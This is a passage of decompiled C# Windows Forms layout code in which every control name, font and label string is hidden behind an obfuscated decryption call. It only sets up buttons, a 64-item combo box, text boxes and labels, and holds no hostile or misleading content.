		((ButtonBase)button60).UseVisualStyleBackColor = false;
		((Control)button60).Click += button60_Click;
		((Control)button67).BackColor = Color.Green;
		((Control)button67).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE6D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549), 8f, (FontStyle)1);
		((Control)button67).ForeColor = SystemColors.ControlLightLight;
		((Control)button67).Location = new Point(113, 194);
		((Control)button67).Margin = new Padding(5, 3, 5, 3);
		((Control)button67).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678F9475 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((Control)button67).Size = new Size(71, 23);
		((Control)button67).TabIndex = 179;
		((Control)button67).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EBA24 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((ButtonBase)button67).UseVisualStyleBackColor = false;
		((Control)button67).Click += button67_Click;
		((Control)button71).BackColor = Color.Green;
		((Control)button71).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 8f, (FontStyle)1);
		((Control)button71).ForeColor = SystemColors.ControlLightLight;
		((Control)button71).Location = new Point(296, 129);
		((Control)button71).Margin = new Padding(5, 3, 5, 3);
		((Control)button71).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C129DC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)button71).Size = new Size(71, 23);
		((Control)button71).TabIndex = 175;
		((Control)button71).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC88AB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((ButtonBase)button71).UseVisualStyleBackColor = false;
		((Control)button71).Click += button71_Click;
		((Control)button72).BackColor = Color.Green;
		((Control)button72).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC10E92 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06), 8f, (FontStyle)1);
		((Control)button72).ForeColor = SystemColors.ControlLightLight;
		((Control)button72).Location = new Point(110, 66);
		((Control)button72).Margin = new Padding(5, 3, 5, 3);
		((Control)button72).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03F607 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)button72).Size = new Size(66, 23);
		((Control)button72).TabIndex = 174;
		((Control)button72).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACBAC3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76);
		((ButtonBase)button72).UseVisualStyleBackColor = false;
		((Control)button72).Click += button72_Click;
		comboBox20.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox20).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB9DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76), 10f, (FontStyle)1);
		((ListControl)comboBox20).FormattingEnabled = true;
		comboBox20.Items.AddRange(new object[64]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x48100313 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF14C4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A122C5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB6BA1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DAA2E7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BFB4A4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BC9070 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875F1B7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF147C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -1721986148 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BC91CC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875F05B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A63B837 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2969E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8EF86 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2655A234 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F143D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB1303 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9ACC91 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71A2AC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BC911A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12236C12 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-836630164 ^ -1276957230 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E94E4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54046C47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12236BF0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC12306 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCA631 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -1522322298 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x4B7B9A47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DC70B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA32535 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DEAEF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8E83E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E95E0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A63BE11 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DEB0B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CD5F2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C295AE3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875F619 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F12C1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71A4BE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -476855864 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E953E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002A76B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DC595 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BC94D6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03FD47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AE92B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DE86B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x3A969BE4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6CB694 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA32713 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCA4CF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -365741115 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E9638 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F72589C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CD7FC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71A654 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -1464174691 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -299926074 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A29F8B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AE8B3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA2E0F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208)
		});
		((Control)comboBox20).Location = new Point(26, 154);
		((Control)comboBox20).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox20).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF1BFE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a);
		((Control)comboBox20).Size = new Size(189, 24);
		((Control)comboBox20).TabIndex = 173;
		comboBox20.SelectedIndexChanged += comboBox20_SelectedIndexChanged;
		((Control)textBox39).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x39931A47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06), 10f, (FontStyle)1);
		((Control)textBox39).Location = new Point(26, 220);
		((Control)textBox39).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875FEF9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)textBox39).Size = new Size(208, 23);
		((Control)textBox39).TabIndex = 166;
		((Control)textBox39).TextChanged += textBox39_TextChanged;
		((Control)label69).AutoSize = true;
		((Control)label69).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x422E9252 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8), 10f, (FontStyle)1);
		((Control)label69).ForeColor = SystemColors.ControlLightLight;
		((Control)label69).Location = new Point(24, 201);
		((Control)label69).Margin = new Padding(5, 0, 5, 0);
		((Control)label69).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x116080D4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((Control)label69).Size = new Size(93, 16);
		((Control)label69).TabIndex = 163;
		((Control)label69).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319D4D2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((Control)textBox45).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710B6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2), 10f, (FontStyle)1);
		((Control)textBox45).Location = new Point(25, 404);
		((TextBoxBase)textBox45).Multiline = true;
		((Control)textBox45).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA13A8A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((Control)textBox45).Size = new Size(590, 150);
		((Control)textBox45).TabIndex = 154;
		((Control)textBox45).TextChanged += textBox45_TextChanged;
		((Control)label76).AutoSize = true;
		((Control)label76).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 10f, (FontStyle)1);
		((Control)label76).ForeColor = SystemColors.ControlLightLight;
		((Control)label76).Location = new Point(235, 410);
		((Control)label76).Margin = new Padding(5, 0, 5, 0);
		((Control)label76).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x11891B75 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)label76).Size = new Size(91, 16);
		((Control)label76).TabIndex = 150;
		((Control)label76).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF0F0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)label77).AutoSize = true;
		((Control)label77).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -747867317 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc), 10f, (FontStyle)1);
		((Control)label77).ForeColor = SystemColors.ControlLightLight;
		((Control)label77).Location = new Point(22, 384);
		((Control)label77).Margin = new Padding(5, 0, 5, 0);
		((Control)label77).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0D567 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((Control)label77).Size = new Size(452, 16);
		((Control)label77).TabIndex = 149;
		((Control)label77).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002AC9D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)textBox48).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -964115579 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a), 10f, (FontStyle)1);
		((Control)textBox48).Location = new Point(222, 155);
		((Control)textBox48).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002AC11 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)textBox48).Size = new Size(193, 23);
		((Control)textBox48).TabIndex = 139;
		((Control)textBox48).TextChanged += textBox48_TextChanged;
		((Control)label87).AutoSize = true;
		((Control)label87).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2BC06 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675), 10f, (FontStyle)1);
		((Control)label87).ForeColor = SystemColors.ControlLightLight;
		((Control)label87).Location = new Point(25, 136);
		((Control)label87).Margin = new Padding(5, 0, 5, 0);
		((Control)label87).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3E97A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)label87).Size = new Size(43, 16);
		((Control)label87).TabIndex = 130;
